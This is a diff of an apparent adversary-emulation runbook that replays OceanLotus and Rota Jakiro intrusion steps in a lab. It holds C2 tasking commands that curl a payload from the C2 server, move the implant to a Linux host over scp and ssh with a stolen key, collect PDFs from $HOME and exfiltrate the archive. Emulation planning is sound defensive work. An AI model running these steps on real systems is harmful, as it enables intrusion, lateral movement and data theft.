@@ -357,42 +357,46 @@ Execute Rota Jakiro
 
 ---
 ### 👾 Red Team Procedures
-Task OceanLotus to download Rota Jakiro to the macOS Host
-```
-./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
-```
+1. Task OceanLotus to download Rota Jakiro to the macOS Host
+   ```
+   ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
+   ```
 
-Veify the file downloaded
-```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
-```
+   Veify the file downloaded
+   ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
+   ```
+   <details><summary>Trouble Shooting</summary>
+     On the C2 server:
+     ```
+     cd /opt/oceanlotus/Resources/payloads
+     python3 -m http.server
+     ```
+     Task the implant
+     ```
+     ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+     ```
+     
+     Veify the file downloaded
+     ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
+     ```
+   </details>
 
->If that doesn't work do the following...
->  On the C2 server:
->  ```
->  cd /opt/oceanlotus/Resources/payloads
->  python3 -m http.server
->  ```
->  Task the implant
->  ```
->  ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
->  ```
->  
->  Veify the file downloaded
->  ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
->  ```
+1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
+   p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
+   ```
 
-Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
-```
-./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
-p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
-```
-
-Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
-```
-./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
-```
-
-Confirm C2 Registration of Rota on the C2 Server
+1. Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
+   ```
+   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
+   ```
+1. Confirm C2 Registration of Rota on the C2 Server
+   Expected Output:
+   ```
+   [INFO] 2023/08/21 18:30:29 Received beacon from existing implant 01020304.
+   [INFO] 2023/08/21 18:30:29 No tasks available for UUID:  01020304
+   ```
 
 <details><summary>Trouble Shooting</summary>
    Check to make sure the binary for rota is in the correct location. Handlers will look for payloads to download using the resources/payloads/<my handler name> logic. 
@@ -408,14 +412,21 @@ Confirm C2 Registration of Rota on the C2 Server
 
 ## Step 4 - Discovery on Linux Host
 ### 📖 Overview
-Discover on Linux Host: 
+
 Upload device info
 
 ---
 ### 👾 Red Team Procedures
-`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`
 
-Confirm device info is printed out
+1. Use Rota Jakiro to collect the device information from the target. 
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_dev_info"}'
+   ```
+   Expected Output:
+   ```
+   [Task] 2023/08/21 18:31:26 drogon-Linux-5.15.0-1040-aws 
+   [SUCCESS] 2023/08/21 18:31:26 Successfully set task output.
+   ```
 
 ### 🔮 Reference Code & Reporting
 <br>
@@ -426,17 +437,49 @@ Confirm device info is printed out
 
 ## Step 5 - Collection
 ### 📖 Overview
-Execute a shared object that includes: 
-create tmp.rota folder 
-move everything into the folder that is a .pdf extension 
-tar all the .pdfs in the folder (exilf.tar.gz)
-Confirm files were created
+Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
+
+Task the implant to upload the shared object (`local_payload_rota.so`) to the target host, the shared object copies and compresses files for collection. 
+
+The following commands are executed by the shared object: 
+- Create a hidden tmp.rota folder 
+- Starting from the $HOME folder, copy files with a .pdf extension into the tmp.rota folder
+- Compress all .pdf files contained in the tmp.rota folder and named `exilf.tar.gz`
+
+Rota Jakiro confirms the target file were created
 
 ---
 ### 👾 Red Team Procedures
-Execute:
 
-run file query command, ensure files & folder exist 
+1. Upload the shared object onto the Linux host.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "payload.so"}'
+   ```
+
+1. Verify the shared object was uploaded to the Linux host. 
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
+   ```
+1. Execute the Rota Jakiro run_plugin command to execute the shared object.
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg": "update"}'
+   ```
+1. Verify the .tar file exsists before exfil.
+```
+./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"/tmp/rota.tar.gz"}'
+```
+
+1. Exfil the `rota.tar.gz` file
+   ```
+   ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/rota.tar.gz"}'
+   ```
+1. Viefity on the C2 server that the file is uploaded.
+```
+ls -lart /ocean-lotus/Resources/controlServer/files
+```
+
+
+
 Confirm: 
 `./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`
 
